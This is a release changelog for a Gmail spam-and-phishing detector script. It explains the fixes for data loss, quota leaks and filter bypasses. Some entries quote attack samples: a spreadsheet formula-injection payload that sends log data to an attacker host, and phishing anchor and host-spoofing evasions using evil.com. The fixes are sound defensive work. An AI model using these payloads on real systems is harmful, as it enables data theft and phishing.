# Changelog

Release history for `SpamDetector.gs`, newest first.

This lived in the file's own header comment until v6.49.0, where it had grown to
459 lines — 11% of the source — and was actively misleading: three consecutive
entries described three incompatible designs for the same function, with nothing
marking which one was live. A reader could not tell the current contract from the
archaeology.

The header now carries only the current contract (purpose, execution flow, the
seven rules). Historical reasoning lives here, where being long is fine.

Each entry says *why*, not just what — these are mostly records of a specific
miss or incident and the reasoning that produced the fix. `git log` has the same
detail plus the diffs.

---

## v6.51.0

Fix the Spam-folder regression properly, and fix two whitelist parse holes that
made the obvious fix dangerous.

**The reported problem was real.** `get@newsletter.bondlyst.com`,
`crew@your.atlantisinvestors.com` and `raju47326yu@gmail.com` were sitting
undeleted in the Spam folder. v6.46.0 stopped the blanket sweep (correct — it
had been permanently deleting Gmail's false positives, unarchived), and v6.50.0
then required our seven rules to independently agree before deleting. Those
rules are tuned for mail that reached the INBOX and have no sender reputation,
domain age or volume data, so they score most Gmail-caught spam clean. All three
survived. The folder became a junk drawer.

**My first fix was worse and a pre-merge review blocked it.** Inverting the
default — delete unless whitelisted — makes `DEFAULT_DOMAINS.legitimate`, 16
hand-maintained strings, the sole guard on a permanent-delete path. It cannot
enumerate a user's correspondents. Verified against the live code: an ordinary
bank alert, a 2FA mail from a small service and a message from a human
correspondent were all deleted. What it really gave up is Gmail's own 30-day
recovery window — a folder the user can open, search and click "Not spam" in —
in exchange for an EML in Drive named by timestamp and eight hex digits.

**The fix is time, not a cleverer verdict.** `reviewGmailSpam()` now age-gates
in the query: `in:spam older_than:CONFIG.gmailSpamGraceDays`. Default 7 days.
The folder still empties on a rolling basis, Gmail's mistakes keep a real
recovery window, and young mail is never even fetched — so the grace period
costs nothing in quota. Whitelisted senders are never deleted at any age, as
belt-and-braces rather than sole protection.

**Two whitelist parse holes, both verified, both now fixed.** Each was harmless
while the consequence was "stays in Spam" and would have been data loss the
moment anything deleted on a failed whitelist match:

- `extractEmailAddress()` only understood `<addr>`, so RFC 2822's comment form
  `notifications@linkedin.com (LinkedIn)` returned the whole string and derived
  a host of `linkedin.com (linkedin)` — a **whitelisted sender failing the
  whitelist check**.
- From was truncated to `maxFromChars` *before* the address was extracted, so a
  display name over 500 characters cut the address away entirely. Now the
  address is taken from the untruncated header and only the pattern-matching
  copy is truncated.

**Leaks the review also caught, all fixed.** Every non-deleting branch now calls
`markReviewed()`, so no message is re-fetched cycle after cycle — the failure
this project has shipped twice. New `deleteMessagePermanently()` reports whether
the delete actually happened, because `markAsSpam()` deliberately falls back to
`thread.moveToSpam()` when the Advanced Service is missing, which previously
incremented the deleted counter while the message survived and was re-archived
to Drive every five minutes. `REVIEW_LIMIT` stays at 20; the age gate collapses
per-cycle volume, so the execution-budget concern that justified raising it
disappears.

Also: `bondlyst.com` and `atlantisinvestors.com` blacklisted, with `.eml`
fixtures — both now fire **Rule 1** on the inbox path, so the blacklist entries
are load-bearing rather than decorative. `raju47326yu@gmail.com` cannot be
blacklisted (`gmail.com`) and relies on the age gate, which is exactly why the
gate rather than a domain list is the fix.

Disposition assertions 45 -> 64, covering the age gate, all four whitelist
header forms, and every non-deleting branch marking the thread. Two of them
caught real bugs in this change: the grace constant was added to `LIMITS` while
the code read `CONFIG`, producing `older_than:undefinedd`, and an assertion that
compared the query against the same undefined expression passed anyway.

## v6.50.3

Actually apply the `docs/BACKLOG.md` update that v6.50.2 claimed to make.

The v6.50.2 patch script aborted on a bad function call before writing the file,
but the version bump, the changelog entry and the push all went ahead — so
v6.50.2 shipped a changelog asserting the backlog had been brought current when
it had not been touched. The claim, not the code, was the defect.

The backlog now genuinely carries: the corrected "as of" version, a **Where to
pick up** section (commands to run, first concrete action, the two behaviours
that want observing, and the note that `BLOG.md` and `SESSION_REPORT.md` are
gitignored), a **Settled — do not re-litigate** section recording the four
disposition decisions with their reasoning, and `reviewGmailSpam()` added to the
list of unlocked destructive entry points.

Worth recording as its own lesson: a patch script that fails partway leaves the
commit describing an intent rather than a result. `validate.py` catches version
and count drift but cannot catch a changelog entry that is simply untrue.

Documentation only.

## v6.50.2

Bring `docs/BACKLOG.md` current. It was written at v6.49.0 and did not know
about `reviewGmailSpam()`, so its list of unlocked destructive entry points was
incomplete and its Spam-folder reasoning was a release out of date.

Added a **Where to pick up** section — the commands to run, the first concrete
action and why, the two new behaviours that need observing before more changes
land, and a note that `BLOG.md` and `tests/SESSION_REPORT.md` are gitignored and
will not survive a clone.

Added a **Settled — do not re-litigate** section recording the four disposition
decisions made on 2026-09-16 with their reasoning, so a future reader does not
reopen them from scratch.

Documentation only.

## v6.50.1

Close a quota leak introduced one release earlier. `reviewGmailSpam()` left
messages it disagreed about with no marker, so they matched
`in:spam -label:SpamDetectorPurge` again on the very next cycle and were
re-evaluated every five minutes indefinitely — 20 threads x 2 Gmail reads x 288
cycles is roughly 11,500 reads a day spent recomputing answers already reached,
against a ~20,000 daily ceiling. Quota exhaustion stops detection entirely, so
this was a self-inflicted outage risk.

Reviewed-and-left messages now get `CONFIG.processedLabel`, and the query
excludes it. The message itself is untouched: still in Spam, unmoved,
undeleted — only the thread label changes.

This is the same failure the day kept producing: a decision made and then not
recorded, so the system recomputes it forever. Two assertions now cover it.

## v6.50.0

Re-judge Gmail's own spam verdicts instead of ignoring them.

v6.46.0 scoped `destroySpam()` to messages this detector itself condemned,
because the blanket sweep was permanently deleting Gmail's false positives
within minutes — unarchived, unlogged, no Trash. That fixed the data loss but
left Gmail-classified spam piling up in a folder the user then has to police by
hand. It traded one bad outcome for a worse experience, and the binary was a
false one.

New `reviewGmailSpam()` runs the seven rules over mail Gmail filed and acts only
on agreement:

    we agree it is spam  ->  archive to Drive, log it, delete it
    anything else        ->  leave it exactly where it is

"Anything else" includes every whitelisted sender, which is the case that
matters. `collectSignals()` returns null for a whitelisted sender, so a LinkedIn
notification Gmail misfiled is never touched — under the old blanket sweep it was
destroyed with no trace.

Deliberately does **not** move anything back to the inbox. Rescuing a false
positive has its own failure mode (a wrong whitelist entry would re-deliver real
spam) and mail reappearing unasked is its own surprise.

Logged as `GMAIL_SPAM_CONFIRMED` rather than `SPAM_DETECTED`, so the training set
can distinguish "we caught this in the inbox" from "Gmail caught it and we
concurred" — different detection events, both genuinely spam.

Scoped by Gmail search (`in:spam -label:SpamDetectorPurge`) rather than label
intersection, because `analyzeMessage()` needs GmailMessage objects that the REST
`list()` does not return. The negative label term is index-dependent, but the
failure mode is benign: a lagging index re-evaluates a message already condemned,
which the sweep would have deleted anyway.

Five disposition assertions cover it, including that a whitelisted sender is
neither deleted nor archived, that the query excludes our own purge label, and
that nothing is ever moved back to the inbox.

Also fixed the test harness itself: the fake messages lacked `getThread()`,
`getReplyTo()` and `getHeader()`, and the stub lacked `Utilities.newBlob()`, so
`accumulateLogEntry()` threw and the archive invariant refused every delete. The
invariant was working; the harness was lying about why. And two Python docstrings
containing `\s` now use raw strings, clearing a SyntaxWarning.

## v6.49.1

Added `docs/BACKLOG.md`: the deferred work from both external reviews, tiered,
with a *why it can wait* and *what would escalate it* for each item — the second
being the part that actually ages well. Also records the known-and-accepted
Signal 7 evasions so they are not rediscovered as bugs, and the four ideas
deliberately rejected.

Documentation only; no behaviour change.

## v6.49.0

Close two zero-cost Signal 7 bypasses, and move this changelog out of the source
header.

**Quote-aware tag scanning.** The open-tag regex `/<a\s[^>]*>/` stopped at the
first `>`, including one inside a quoted attribute value, so
`<a title=">" href="https://evil.com/">VIEW IN DOCUSIGN</a>` lost its href
entirely: the "tag" ended at the title's `>`, contained no href, and the scan
resumed past the real one. Every mail client renders and navigates that anchor
normally. Replaced with `findTagEnd()`, a bounded character walk that tracks
quote state — linear, no backtracking.

**HTML5 slash separator.** `<a/href="...">` was invisible because the scanner
required whitespace after `<a`, and the attribute matcher required whitespace
before the name. `/` is a valid attribute separator and clients navigate it
fine. Cost to evade: one character.

**Accessible-name attributes.** An image CTA defeated Signal 7 completely:
`<a href="https://evil.com/"><img alt="View in DocuSign"></a>` has no text node
at all, so the tag-stripper produced an empty string. This is not exotic — an
image button is what real phishing already uses, because it renders identically
and dodges text scanners. `extractAttributeValues()` now harvests `alt`,
`title` and `aria-label` from the anchor's own tag and anything nested inside
it, and they are matched alongside visible text. A mail client shows the user
"View in DocuSign"; now so does the detector.

New `LIMITS.maxAnchorTagChars` (4000) bounds the tag scan. Measured: a 200KB
unterminated tag and 100,000 quoted `>` characters each complete in under a
millisecond.

**Changelog moved to CHANGELOG.md.** It had reached 459 lines — 11% of the
source — and was actively misleading rather than merely long: the v6.42.0,
v6.44.0 and v6.46.0 entries described three incompatible designs for
`destroySpam()` and `quarantineAsPhishing()` as if all were current, with
nothing marking which was live. The header now carries only the current
contract and is 41 lines. `scripts/validate.py` check 2 moved with it and now
also asserts entries are newest-first.

## v6.48.2

Stop buffering raw message content. Completes the v6.47.0 memory fix, which was only half done: archiveRawEml() writes the EML to Drive synchronously, so nothing reads entry.rawContent again, yet it was still stored on every buffered log entry. That held up to CONFIG.maxEmailsPerRun full raw messages in memory until the flush — 50 x potentially 25MB, because getRawContent() is not bounded by CONFIG.maxEmailSizeBytes (that guard reads getBody()). The buffer now holds only the small Sheets row.

## v6.48.1

Remove the unused script.external_request OAuth scope. Nothing in this file has ever called UrlFetchApp — verified zero references — so the one scope that grants outbound network access was pure downside. Without it, code running in this project can read and delete mail but cannot send it anywhere: destruction is possible, exfiltration is not. NOTE: narrowing a manifest does NOT prompt for re-consent, because the script is asking for a subset of what was already granted. The previously granted token stays broader until the user revokes access at myaccount.google.com and re-approves. Until then this change is declarative only. gmail.modify and gmail.labels are deliberately left in place: both are strict subsets of mail.google.com, which is required because gmail.modify cannot permanently delete. Removing them would change nothing but the consent screen wording, at some risk.

## v6.48.0

recheckRecentSpamChecked() holds for review instead of deleting. This path re-judges mail the user has ALREADY READ AND KEPT, and it is forced to run within a minute of every deploy. Until now it called disposeDetectedMessage(), so a newly deployed pattern permanently deleted up to 20 such messages immediately, with nothing between a new regex and the loss but a 22-file ham corpus. It was the highest-blast-radius consequence of a bad pattern in the system and the one most likely to be exercised, because a pattern is added precisely when it is new and unproven. New holdForReview() archives the message out of the inbox and labels it CONFIG.reviewLabel. The inbox still gets cleaned and the recheck query (scoped to in:inbox) will not see it again, but nothing is destroyed. No SPAM label is applied, so destroySpam() can never reach it either. The same reasoning that gave Rule 7 a quarantine applies with more force here: on the day a pattern changes, every rule has an unproven false-positive class. checkFalseNegatives() still deletes, and that asymmetry is deliberate — a manual SpamMissed label is the user ASKING for destruction, whereas the recheck is the script overruling a decision the user already made. Also centralised the review label as CONFIG.reviewLabel (it was hardcoded in four places) and added seven disposition assertions covering the hold path.

## v6.47.1

Documentation accuracy pass. No behaviour change. docs/index.html is the published GitHub Pages site and was stale on nearly everything: six rules instead of seven (so it stated that every detection is permanently deleted), a reportSpam() function that does not exist, a feature vector in which not one field name was real, three different wrong ham counts, a claim that Gmail's Spam folder never auto-clears used to justify behaviour since removed, an assertion that GitHub/Stripe/PayPal/banks ship whitelisted when they do not, and a description of the folder-wide sweep as a safety feature. All corrected, Rule 7 and the quarantine documented, and the real nine-field signal object published for the ML dataset section. README: signal list said 6 in one place and 8 in another against 9 in code; rule list said 4 against 7; "~120 lines of detection logic" was off by 3x; the Vaporizer section still promised everything is deleted. Added a labels table — five labels appear in the sidebar and the docs named two. docs/SPAM_LOGGING_PLAN.md marked as shipped rather than "approved for implementation", with the schema enum and rule range corrected. docs/EXPORTING_EMAILS.md lost the completed PDF-to-.eml migration instructions and gained a section on actually adding a fixture to the corpus.

## v6.47.0

Security hardening after an external review declined sign-off. Six findings, all verified by running the shipped code.

(1) ARCHIVE-BEFORE-DELETE WAS NOT REAL. Four comments asserted it; none were true. accumulateLogEntry() only buffered, and the Drive write happened in flushSpamLog() AFTER the thread loop, so the actual order was batchDelete then archive. A 6-minute timeout, an unset SPAM_LOG_FOLDER_ID, a memory kill or a throw from maintenance each destroyed mail with no copy, and the buffer is cleared in a finally so nothing carried over. The recovery story the v6.44.0 post-mortem relied on did not exist. New archiveRawEml() writes the EML synchronously and reports success; disposeDetectedMessage() now REFUSES the destructive branch without it and holds the message for review instead. The invariant is enforced in code and asserted in tests rather than described in comments.

(2) SHEETS FORMULA INJECTION. setValues() evaluates formulas — the code depends on that for its =HYPERLINK column — and the Subject, display name, address and Reply-To were written raw. A subject of =IMPORTXML("https://attacker/?x="&ENCODEURL(JOIN(",",A2:R500))) fires on document open in the user's authenticated session and exfiltrates the whole detection log. New escapeSheetCell() apostrophe-prefixes anything starting with = + - @ tab or CR, and caps cell length: an over-long subject used to make setValues() throw, discarding the log rows for an entire batch of already-deleted mail.

(3) QUADRATIC REGEX DoS. Fifteen patterns have the shape X.*Y, which backtracks quadratically when X matches often. Measured: a 100KB subject of "Trump " cost 3.5s, and 200KB across subject+from cost 14s — one email blowing the 6-minute budget, killing the run before threads are labelled so the next trigger repeats it forever, a self-sustaining denial of detection. The 100 000-char cap bounded nothing useful. Added maxSubjectChars

(2000) and maxFromChars (500). The ReDoS analysis comment was wrong and said so confidently; corrected.

(4) OVERSIZE-BODY BYPASS. A body over maxEmailSizeBytes was skipped unevaluated and then stamped SpamChecked, so padding the HTML defeated all seven rules at zero cost and the message was never reconsidered. Such threads are now flagged SuspectedSpam.

(5) WHITESPACE PLAIN PART. A text/plain body of one space is truthy, so the HTML fallback never ran and Signals 2b, 2c and 2d all saw an empty body. One space disabled every body signal. Fixed with .trim().

(6) cleanseInbox() still had the substring whitelist/blacklist matcher that v6.42.0 fixed in collectSignals() only — and matched the DISPLAY NAME, so "Dragonfly Capital" was whitelisted and "FinanceBuzz Weekly" from a legitimate domain was permanently deleted, with no archive at all. It hand-rolled the pipeline and then called analyzeMessage() anyway; the duplicate is deleted and it now shares one code path. Also: isBulkEmail() scans the first 64KB rather than lowercasing a 25MB message; checkFalseNegatives() gained the result cap every other search already had, and honours the archive invariant; removed dead refreshWhitelist/refreshBlacklist (77 lines, obsolete since v6.35.0) and the dead phishing-label block in destroySpam(); corrected four factually wrong comments; scripts/validate.py is wired into CI and its broken README-tag check replaced with an @version/SCRIPT_VERSION agreement check; CI path filters now include scripts/, .claspignore and docs/ — the files that broke four deploys did not trigger the workflow.

## v6.46.0

Scope the spam sweep to this detector's own verdicts. destroySpam() deleted the ENTIRE Spam folder every few minutes — including mail Gmail's classifier filed, which this script never evaluated. That path calls neither accumulateLogEntry() nor the Drive archiver, so a Gmail false positive was destroyed permanently, unlogged and unrecoverable, within minutes. The docstring described clearing "pre-existing spam" as a feature; it was the largest irreversible data-loss path in the system by volume, and v6.44.0 shrank the window from 15 to 5 minutes without recognising that. markAsSpam() now tags each message with CONFIG.purgeLabel in the same modify() call that reports it as spam, before attempting the delete, and destroySpam() lists the label INTERSECTION ['SPAM', purgeLabel]. Deliberately an intersection rather than a q: filter: a q: reads the eventually-consistent search index, and an index-lagged query is what destroyed a quarantined message on 2026-09-16. If the tag is index-lagged the message is simply not swept this cycle — a delayed delete, not a premature one. If the label cannot be resolved at all the sweep runs on NOTHING rather than falling back to emptying the folder. Gmail purges its own Spam at 30 days, so the folder still gets cleared; the difference is that the user can now reach into it. New purgeAllSpamNow() keeps the empty-the-folder capability as a deliberate manual action rather than a background sweep. New getLabelId() resolves a label name to the REST API id (GmailApp label objects do not expose it), cached per execution. tests/test_disposition.js grew to 25 assertions: the tag is applied before the delete and in one call, our verdict IS swept, Gmail-classified spam is NOT, the scope is a label intersection with no q: filter, and the sweep refuses to run if the label cannot be resolved.

## v6.45.3

Stop clasp uploading Node test scripts. clasp treats ANY .js under rootDir as Apps Script source, and .claspignore's bare "*.js" matches only top-level files, so adding scripts/patch_version.js broke the deploy with "ParseError: Unexpected token ILLEGAL ... file: scripts/patch_version.gs". Added a scripts directory glob and a recursive .js glob (the latter cannot be written literally here — it would close this comment block). tests/test_patch_version.js now walks the repo for .js files and asserts each is excluded, so a future Node helper cannot break the deploy the same way.

## v6.45.2

Guard version extraction in the deploy workflow. grep -oP prints every match on its own line, so a commit subject naming two versions produced a multi-line $VERSION and broke the deploy. patch_version.js rejected it loudly; the sed it replaced would have mangled the source silently. head -n1 applied at all three extraction sites (patch, validate, tag). Keep commit subjects to one version string regardless.

## v6.45.1

Fix the deploy step that blocked v6.45.0. The anchored @version sed added in v6.43.0 had to survive YAML block-scalar, shell double-quote and sed-expression quoting at once; it parsed on BSD sed locally and failed on GNU sed in CI with "unterminated `s' command", after the test job had already gone green. So v6.45.0's code was never deployed. Replaced by scripts/patch_version.js, covered by tests/test_patch_version.js in the test job, so a broken version patch now fails tests rather than the deploy.

## v6.45.0

Hardening pass on v6.42.0-v6.44.0 after external review. Six defects, four of them verified by running the live code:

(1) Quarantine was not terminal. processInbox() skipped the SpamChecked label whenever spamCount > 0, an invariant that meant "thread was deleted" until Rule 7 started leaving threads alive. A quarantined thread still holding INBOX (a reply-chain lure leaves a sibling there, or the user un-archives it) was re-detected every minute: ~1440 PHISHING_DETECTED rows and Drive EMLs per day, corrupting the detection log that exists to train a model. processThread() now reports `destroyed` explicitly, quarantine applies processedLabel, and both search queries exclude phishingLabel.

(2) addressMatchesDomain()'s substring fallback matched the LOCAL PART, which is attacker-chosen: dragonfly@attacker.tld was

WHITELISTED (a free bypass of the whole detector, from a list published in this repo) and financebuzz@realcompany.com was

BLACKLISTED, i.e. Rule 1, i.e. permanently deleted. Nine blacklist entries have no dot, so the delete path was broadly exposed. Fallback now tests the host only, and '@' entries must end on a domain-label boundary.

(3) 'signnow' removed from BRAND_CTA_DOMAINS. Anchor text is normalized by stripping non-alphanumerics, so the ordinary button label "Sign Now" collapsed to "signnow" and fired Rule 7 on legitimate Ironclad and BambooHR buttons.

(4) TRACKER_LABELS was a one-CNAME bypass: r.evil.com or click.evil.com made Signal 7 abstain regardless of who owned the parent domain. The original Capital B lure would have escaped for the cost of one DNS record. The label heuristic now requires the parent to be sender-aligned, which is the only shape it actually models; third-party ESP trackers still match by domain.

(5) The 60-char CTA cap measured raw text, so zero-width padding (JS \s does not match U+200B) and plain verbosity both evaded it — a natural 67-char label was invisible. Now measured on the normalized alphanumeric text at 80.

(6) hasBrandMismatchedCta() received the sanitizeInput()-truncated body, capping HTML at 100 000 chars. That made LIMITS.maxHtmlScanChars dead config and hid any CTA past 100KB, which real marketing HTML with inlined CSS routinely exceeds. It now gets the untruncated body; extractAnchors() is independently bounded, which was the point of those limits. Also: disposeDetectedMessage() allowlists the destructive branch instead of defaulting to it, so an unidentifiable verdict quarantines rather than deletes; _quarantinedThisRun (which disabled the entire spam sweep for a whole execution) replaced by per-id exclusion; recheckRecentSpamChecked() gated on version change plus a 30-minute floor rather than the 5-minute timer, since its trigger is a pattern change, not the clock. New tests/test_disposition.js — 18 assertions, wired into CI — is the first automated coverage of the code that irreversibly deletes mail, and regression-tests both the 2026-09-16 incident and the re-quarantine loop.

## v6.44.0

CRITICAL FIX — a quarantined phishing message was permanently deleted. On 2026-09-16 Rule 7 correctly caught "Capital B | Bitcoin Policy Brief" and quarantined it, logging PHISHING_DETECTED with signals BULK,BRAND_MISMATCH_CTA. Within the SAME execution, destroySpam() then batch-deleted it. Cause: quarantine moved the message to SPAM and relied on destroySpam()'s "-label:Phishing" query to spare it. That query reads Gmail's SEARCH INDEX, which is eventually consistent. The Phishing label had been applied seconds earlier, the index did not reflect it yet, and the message was swept. v6.43.0 made this certain rather than merely possible by forcing the maintenance cycle in the same execution as detection. Fix is structural, not a better query: quarantine no longer applies the SPAM label at all. It archives (removes INBOX) and labels. destroySpam() lists labelIds:['SPAM'], so a message that never carries that label cannot be swept regardless of index state — the race is gone by construction rather than narrowed. Cost: Gmail's classifier no longer learns from Rule 7 hits. That is the right trade — Rule 7 is the one rule with an irreducible false-positive class, and not destroying mail outranks filter training. Rules 1-6 still report to SPAM and still delete. Added _quarantinedThisRun as a safety interlock so any future change that reintroduces a SPAM move cannot silently recreate the race. Also reduced the maintenance interval from 15 to 5 minutes (quota math in runPeriodicMaintenance). The deleted message was recoverable: v6.32.0 archives the raw EML to Drive BEFORE deletion, which is the only reason this was a recoverable incident rather than permanent data loss.

## v6.43.0

Restore prompt post-deploy recatch. v6.36.0 promised that a fix deploy cleans up after itself unattended, and before v6.40.0 it did: recheckRecentSpamChecked() ran on every 1-minute invocation, so a newly-deployed pattern re-caught its target within about a minute. v6.40.0 moved maintenance behind a 15-minute gate for performance and silently made that up to 15x slower, which is why a freshly deployed fix appears to do nothing for a quarter hour. runPeriodicMaintenance() now forces one immediate cycle when SCRIPT_VERSION differs from the last version recorded in Script Properties. Once per deploy, not once per minute, so the v6.40.0 performance win is kept. LAST_SEEN_VERSION is written BEFORE the cycle runs so a throwing maintenance function cannot force a fresh cycle every minute and burn Gmail API quota. Chosen over a CI step that calls the Apps Script Execution API: no manifest executionApi block, no API-executable deployment, no extra OAuth scopes, and it also covers deploys made outside CI (manual clasp push, or an edit in the Apps Script editor). SCRIPT_VERSION is patched by the deploy workflow in its own sed, separate from the header tag, and verified by grep so a silent patch failure fails the deploy rather than disabling detection.

## v6.42.0

Catch brand-mismatched CTA phishing — the first signal that reads the LINK GRAPH instead of sender-side vocabulary. Missed email: "Capital B | Bitcoin Policy Brief" from info@cptlbnews.press (a cousin of the real cptlb.com), sent via Resend over Amazon SES. It scored ZERO on all eight existing signals except bulk — no clickbait, no fear, no Unicode obfuscation, valid SPF+DKIM for its own domain, a real corporate footer with a real Euronext ticker, and hedged modal prose throughout ("a reported 7-10% withholding provision ... could apply"). Not a threshold miss; a total signal vacuum. The only evidence in the message was its links: a button reading "VIEW IN DOCUSIGN" pointing at cptlbpolicy.com. Added: (1) Signal 7 / Rule 7 — hasBrandMismatchedCta() fires when anchor text names a BRAND_CTA_DOMAINS key, carries a CTA verb and normalizes to <=80 chars (a button label, not prose), while the href host belongs to neither that brand, a known link wrapper, nor the sender. Not gated on bulk — this class also arrives via compromised accounts, the same reasoning Rule 6 accepted.

(2) LINK_WRAPPER_DOMAINS + TRACKER_LABELS — the signal ABSTAINS on click-trackers and CNAMEd trackers. A wrapped destination is unverifiable, not malicious. This abstention is load-bearing: ablation shows that without it, a legitimate SendGrid-tracked invoice with a "View in DocuSign" button false-positives.

(3) extractUrlHost() / hostMatchesDomain() — host parsing that resists the docusign.net.evil.com suffix bug, the notdocusign.net prefix bug, and the docusign.net@evil.com userinfo trick.

(4) decodeHtmlEntities() and nested-tag stripping, so "D&#111;cu&shy;Sign" and "<span>Docu</span><span>Sign</span>" still match. Entity decoding is load-bearing, not cosmetic.

SECURITY FIX (unrelated to the miss, found while reviewing the same function): whitelist and blacklist matching used substring comparison, so "mail@linkedin.com.secure-login.top" and "a@notlinkedin.com" were WHITELISTED and skipped all detection. Now addressMatchesDomain() — exact or dot-suffix. Rule 7 QUARANTINES rather than deletes: reported to Gmail as spam and labelled "Phishing", but no batchDelete, so it stays recoverable. destroySpam()'s sweep excludes that label — without that exclusion the quarantine would be silently destroyed within one 15-minute maintenance cycle. Routing lives in disposeDetectedMessage() so processThread() and recheckRecentSpamChecked() cannot drift; checkFalseNegatives() deliberately still deletes, because a manual "SpamMissed" label is an explicit human instruction. Also: truncate before stripHtmlTags() rather than after (was running two regex passes over up to 5MB); add serviceImpersonation and brandMismatchedCta to debugWhyFlagged(), which has under- reported since v6.38.0; log Rule 7 as PHISHING_DETECTED.

## v6.41.0

Catch hardware-wallet phishing missed via legit SurveyMonkey sending infra ("🔐 System Configuration Notice" template). Three additions: (1) 🔐 added to clickbait emoji cluster — phishing "security notice" decoration that legit 2FA/security mail (Google, Apple, GitHub) does not lead with. (2) Two new BODY_CRYPTO_PATTERNS: \bhardware wallet\b and a tight wallet/firmware "manual update" phrase (deliberately excludes "device" to avoid FP on legit Apple/ IT iOS-update mail). (3) New BODY_FEAR_PATTERNS array (Signal 2c) for phishing-specific conditional-fear body phrases — "your access could be compromised". Legit security alerts use definitive past tense ("was compromised"); conditional future ("could be") is the phishing tell. Each match increments clickbaitCount. Together fire Rule 4 (3+ clickbait) regardless of whether SurveyMonkey infra is bulk-detected. Added ham FP guards: Apple iOS update notice + Google 2FA setup (subject decorated with 🔐).

## v6.40.0

Performance overhaul for 1-minute trigger intervals. Five changes:

(1) Fast-path exit — processInbox() returns after a single GmailApp.search() when no threads are found; no label lookup, no body fetches, no maintenance. (2) Periodic maintenance — checkFalseNegatives(), recheckRecentSpamChecked(), and destroySpam() run at most every 15 min via a Script Properties timestamp instead of every invocation. (3) getMessagesForThreads() batching — N thread.getMessages() calls collapsed to 1 batched API call in processInbox() and recheckRecentSpamChecked().

(4) Whitelist-first in collectSignals() — sender whitelist checked immediately after getFrom(), skipping getRawContent() for known- good senders. (5) Domain list caching — getWhitelist()/getBlacklist() called once per execution via _cachedWhitelist/_cachedBlacklist.

## v6.39.0

Catch political-financial scam miss (economicrulebook.com). Add iterable.com to BULK_EMAIL_FINGERPRINTS (Iterable marketing platform). Add two clickbait patterns: political-looting narrative ("ripped off", "looted", "robbed", "bilked") and payback/revenge framing ("payback time", "now it's time"). Blacklist economicrulebook.com. Together these fire Rule 2 (bulk + 2 clickbait) and Rule 1 (bulk + blacklist) on "America Was Ripped Off for 50 Years – Now It's Payback Time" class emails. Also add BODY_UNICODE_PATTERNS — Cyrillic/Greek/fullwidth/math-alphanumeric check against the email body (Signal 2d). Previously these Unicode obfuscation patterns only fired on subject+from; spammers evade that by embedding obfuscated text in HTML body anchors.

## v6.38.1

Fix logging for Rule 6. getRuleFromSignals() and buildSignalsCsv() were not updated when Rule 6 was added — phishing emails logged Rule=NONE, empty signals, and Log Type=SPAM_DETECTED. Now logs Rule 6, SERVICE_IMPERSONATION in signals, and PHISHING_DETECTED as the log type so phishing rows are visually distinct.

## v6.38.0

Rule 6 — service impersonation phishing detection. Adds IMPERSONATION_SUBJECT_PATTERNS (cloud service share notification subjects) and CLOUD_SERVICE_DOMAINS (trusted sender domains). Emails whose subject matches a known cloud service notification template (e.g. "Document shared with you") but whose sender is not from the expected service domain are classified as phishing without requiring bulk email infrastructure — compromised legitimate accounts are the typical delivery vector.

## v6.37.0

Three operational fixes. (1) Lock-skip log visibility: logDebug → logInfo so a blocked manual trigger shows "Skipping run — previous execution still in progress" instead of silence. (2) Mailchimp bulk detection: add mcsv.net to BULK_EMAIL_FINGERPRINTS so Mailchimp- routed spam is recognised as bulk email. (3) Military pattern: extend to attacks?|attacking so "-ing" verb forms fire the clickbait signal.

## v6.36.0

Auto-recheck false negatives — recheckRecentSpamChecked() runs at the end of every processInbox() trigger cycle. Re-evaluates inbox emails carrying SpamChecked from the last 2 days against current patterns. Any that now score as spam are logged FALSE_NEGATIVE and deleted automatically — no manual SpamMissed labeling needed after a fix deploy.

## v6.35.0

Catch health/political spam miss (finrisex.com). Blacklist finrisex.com. Whitelist conservativebc.ca. Add MAHA to celebrity pattern + "report" as a trailing verb. Expand STOP imperative to include "putting/eating/ drinking". Add suppression conspiracy pattern ("watch before this gets buried"). Fix domain-list architecture: getBlacklist()/getWhitelist() now merge DEFAULT_DOMAINS directly at runtime so new source-code entries are live immediately after deploy — no manual refreshBlacklist() / refreshWhitelist() call needed ever again.

## v6.34.0

Add LockService guard to processInbox() — prevents overlapping executions when a run takes longer than the trigger interval. tryLock(0) skips (rather than queues) concurrent invocations.

## v6.33.0

Remove fixSheetHyperlinks() — one-time migration utility, already run. Dead code.

## v6.32.0

Spam intelligence logging — every detected spam is archived as a raw EML in Google Drive (Spam Intelligence/Detected/) and logged as a structured row in a Google Sheets spreadsheet (19 cols: timestamp, log type, IDs, Drive URL, sender info, rule fired, signals, and manual notes columns). False negatives supported via "SpamMissed" Gmail label — user labels escaped spam, next run logs and deletes it, populating a FALSE_NEGATIVE row. New functions: setupLogging() (one-time setup), checkFalseNegatives(), accumulateLogEntry(), flushSpamLog(), getOrCreateLogSubfolder(), getRuleFromSignals(), buildSignalsCsv(). Logging is fully non-blocking — any Drive/Sheets failure is caught and logged without affecting spam deletion. New OAuth scopes: drive, spreadsheets. Run setupLogging() once after deploy to authorize.

## v6.31.0

Blacklist 1stamericanpath.com (Pre-IPO investment spam mill). Fix stock price pattern to also match $X/share (slash separator).

## v6.30.0

Blacklist morningstockadviser. Add income-opportunity clickbait pattern (second/passive/extra/side income).

## v6.29.0

Security hardening — fix display-name spoofing bypass (whitelist/ blacklist now match against extracted email address only, not full From string). Add stripHtmlTags() HTML body fallback so BODY_CRYPTO_PATTERNS fire on HTML-only emails. Add Phase 5 edge case tests, Phase 6 performance benchmark, ReDoS analysis comment. Pin clasp@3.3.0 in CI. Delete stale archive/.

## v6.28.0

Catch homoglyph-obfuscated health spam (frontiercapitalreport.com). Add Unicode homoglyph pattern to CLICKBAIT_PATTERNS.

## v6.27.0

Comment pass + README/CI fixes for 1st-year CS student clarity.

## v6.26.0

Harden test parser — state machine bracket tracking, flag validation, pattern count cross-checks, parser self-tests.

## v6.25.0

Option B — test suite parses SpamDetector.gs directly (single source of truth). Tests extract all patterns at import time; no pattern duplication between source and tests.

## v6.24.0

L3/L5 review fixes — RFC2822_QUOTED_NAME constant, Rule 0→1 comments, maxAllowedEmailsPerRun/maxAllowedDaysToCheck into LIMITS, empty-domain guard on addToWhitelist/addToBlacklist, \uD835 surrogate explanation.

## v6.23.0

Extract BULK_EMAIL_FINGERPRINTS constant + isBulkEmail() helper. Fixes cleanseInbox() missing toLowerCase and test_spam_detector.py missing x-ses-.

## v6.22.0

Improve all comments for clarity at introductory CS level. Fix @version tag, rule numbering in header and docstrings, plain-English explanations for ReDoS, log injection, RFC 2822.

## v6.21.0

CS professor refactor — JSON.parse fallback on corrupt Script Properties, patterns to module-level constants, split analyzeMessage() into collectSignals()/makeVerdict(), named

